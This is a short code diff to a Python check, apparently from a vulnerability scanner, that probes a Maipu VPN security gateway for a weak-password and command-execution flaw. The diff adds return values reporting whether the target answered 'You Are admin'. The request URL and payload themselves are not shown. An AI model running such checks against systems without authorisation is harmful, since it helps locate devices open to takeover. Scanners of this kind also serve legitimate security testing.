@@ -37,11 +37,14 @@ class mpsec_weakpass_exec_BaseVerify:
             req = requests.get(vulnurl, headers=headers2, timeout=10, verify=False)
             if r"You Are admin" in req.text:
                 cprint("[+]存在迈普vpn安全网关执行命令漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "迈普vpn安全网关弱口令&&执行命令", str(payload), req.text
             else:
                 cprint("[-]不存在mpsec_weakpass_exec漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 
 if __name__ == "__main__":
